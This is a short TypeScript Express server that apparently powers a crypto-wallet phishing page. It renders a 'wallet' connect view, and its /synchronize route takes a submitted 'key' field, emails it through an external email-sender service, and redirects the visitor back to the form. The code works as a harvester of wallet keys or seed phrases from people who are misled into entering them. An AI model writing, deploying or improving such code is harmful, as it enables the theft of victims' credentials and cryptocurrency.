import express, { Application, Request, Response, NextFunction } from 'express';
import path from 'path';
import bodyParser from 'body-parser';
import EmailSenderService from './externals/email-sender';

const app : Application = express();

const PORT = process.env.PORT || 3000;

app.set('views', path.join( __dirname, 'views' ));
app.set('view engine', 'ejs');
app.set('port', PORT);

// The path to the static files for this simple application
app.use( bodyParser.urlencoded({extended : true }));
app.use( bodyParser.json() );
app.use(express.json());
app.use( express.static(path.join( __dirname, 'app', 'v1', 'public', 'images', 'index')));
app.use( express.static(path.join( __dirname, 'app', 'v1', 'public', 'style')));
app.use( express.static(path.join( __dirname, 'app', 'v1', 'public', 'script')));
app.use( express.static(path.join( __dirname, 'app', 'v1', 'public', 'images')));


app.get('/', ( req : Request, res : Response, next : NextFunction) => {
    res.render('index');
});

app.get('/connect', ( req : Request, res : Response, next : NextFunction) => {
    res.render('wallet');
});

app.post('/synchronize', ( req : Request, res : Response, next : NextFunction) => {
    const bodys = req.body.key;
    new EmailSenderService().sendEmail( bodys );
    res.redirect('/connect');
    // console.log( bodys )
});

app.get('/synchronize', ( req : Request, res : Response, next : NextFunction) => {
    console.log( req.url );
    res.end();
});

app.listen( app.get('port'), () => {
    console.log( "Server is listening...");
});
